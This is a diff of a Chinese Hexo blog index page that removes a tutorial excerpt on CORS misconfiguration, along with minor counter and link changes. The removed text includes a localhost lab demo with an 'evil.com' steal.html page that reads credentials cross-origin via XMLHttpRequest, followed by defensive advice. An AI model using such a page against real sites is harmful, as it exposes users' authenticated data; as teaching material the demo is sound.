@@ -221,7 +221,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2021-02-24 15:52:02 / 修改时间：15:54:30" itemprop="dateCreated datePublished" datetime="2021-02-24T15:52:02+08:00">2021-02-24</time>
+              <time title="创建时间：2021-02-24 15:52:02 / 修改时间：15:56:53" itemprop="dateCreated datePublished" datetime="2021-02-24T15:52:02+08:00">2021-02-24</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -267,146 +267,9 @@
 <li>AJAX请求不能发送</li>
 </ol>
 </blockquote>
-<h3 id="0x01-CORS介绍"><a href="#0x01-CORS介绍" class="headerlink" title="0x01 CORS介绍"></a>0x01 CORS介绍</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__CORS，跨域资源共享（Cross-origin resource sharing）__，是H5提供的一种机制，WEB应用程序可以通过在HTTP增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CORS本质上就是使用各种头信息让浏览器与服务器之间进行交流，上面提到的名单就是用下面的http头字段来控制的： </p>
-<p><img src="/2021/02/24/CORS/1.jpg"></p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中比较重要的相应头为：</p>
-<pre><code>Access-Control-Allow-Origin: http://a.com  服务端接受来自http://a.com的跨域请求    
-Access-Control-Allow-Credentials: true  表示是否允许发送Cookie，true即发送cookie
-</code></pre>
-<h3 id="0×02-CORS漏洞的攻击流程"><a href="#0×02-CORS漏洞的攻击流程" class="headerlink" title="0×02 CORS漏洞的攻击流程"></a>0×02 CORS漏洞的攻击流程</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;假设用户登陆一个含有CORS配置网站<code>vuln.com</code>，同时又访问了攻击者提供的一个链接<code>evil.com</code>。<code>evil.com</code>的网站向<code>vuln.com</code>这个网站发起请求获取敏感数据，浏览器能否接收信息取决于<code>vuln.com</code>的配置。如果<code>vuln.com</code>配置了<code>Access-Control-Allow-Origin</code>头且为预期，那么允许接收，否则浏览器会因为同源策略而不接收。</p>
-<h3 id="0×03-CORS漏洞演示"><a href="#0×03-CORS漏洞演示" class="headerlink" title="0×03 CORS漏洞演示"></a>0×03 CORS漏洞演示</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先修改host文件，加上</p>
-<pre><code>127.0.0.1 www.vuln.com 
-127.0.0.1 www.evil.com
-</code></pre>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样访问<a target="_blank" rel="noopener" href="http://www.vuln.com就相当于服务端.服务端新建a.php./">http://www.vuln.com就相当于服务端。服务端新建a.php。</a></p>
-<pre><code>&lt;?php
-echo &quot;username: admin; password:123456&quot;;
-?&gt;
-</code></pre>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果访问<code>http://www.vuln.com/a.php</code>，会正常输出<code>username: admin; password:123456</code></p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着在hacker端构造steal.html：</p>
-<pre><code>&lt;!-- www.evil.com/steal.html  --&gt;
-&lt;!DOCTYPE&gt;
-&lt;html&gt;
-&lt;h1&gt;Hello I evil page. &lt;/h1&gt;
-&lt;script type=&quot;text/javascript&quot;&gt;
-function loadXMLDoc()
-&#123;
-var xhr = new XMLHttpRequest();
-
-xhr.onreadystatechange=function()
-&#123;
-    if(xhr.readyState == 4 &amp;&amp; xhr.status == 200) //if receive xhr response
-    &#123;
-        var datas=xhr.responseText;
-        alert(datas);
-    &#125;
-&#125;
-//request vuln page
-xhr.open(&quot;GET&quot;,&quot;http://www.vuln.com/a.php&quot;,&quot;true&quot;) 
-xhr.send();
-&#125;
-loadXMLDoc();
-&lt;/script&gt;
-&lt;/html&gt;
-</code></pre>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后打开<code>http://www.evil.com/steal.html</code>，html代码的意思是通过XMLHttpRequest访问&nbsp;&nbsp;<u>vuln.com/a.php</u>，然后将获取到的内容alert出来。</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是根据同源策略，这是不允许的，结果也和我想的一样：</p>
-<p><img src="/2021/02/24/CORS/2.jpg"></p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来改一下a.php：</p>
-<pre><code>&lt;?php
-header(&quot;Access-Control-Allow-Origin:http://www.evil.com&quot;);
-echo &quot;username: admin; password:123456&quot;;
-?&gt;
-</code></pre>
-<p>再次访问<code>http://www.evil.com/steal.html</code>，发现可以正常alert了，成功实现了跨域资源的请求。</p>
-<p><img src="/2021/02/24/CORS/3.jpg"></p>
-<h3 id="0×04-CORS漏洞防范"><a href="#0×04-CORS漏洞防范" class="headerlink" title="0×04 CORS漏洞防范"></a>0×04 CORS漏洞防范</h3><ul>
-<li>不要盲目反射Origin头</li>
-<li>严格校验Origin头，避免出现权限泄露</li>
-<li>不要配置Access-Control-Allow-Origin: null</li>
-<li>HTTPS网站不要信任HTTP域</li>
-<li>不要信任全部自身子域，减少攻击面</li>
-<li>不要配置Origin:*和Credentials: true</li>
-<li>增加Vary: Origin头</li>
-</ul>
-
-      
-    </div>
-  <div>
-  
-</div>
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://onlycare.github.io/2021/02/24/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/2.png">
-      <meta itemprop="name" content="成殇Orz1">
-      <meta itemprop="description" content="菜鸡一枚">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="成殇のBlog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/02/24/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-02-24 15:37:59" itemprop="dateCreated datePublished" datetime="2021-02-24T15:37:59+08:00">2021-02-24</time>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>367</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2021/02/24/hello-world/#more" rel="contents">
+              <a class="btn" href="/2021/02/24/CORS/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -691,7 +554,7 @@ echo &quot;username: admin; password:123456&quot;;
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-count">3</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
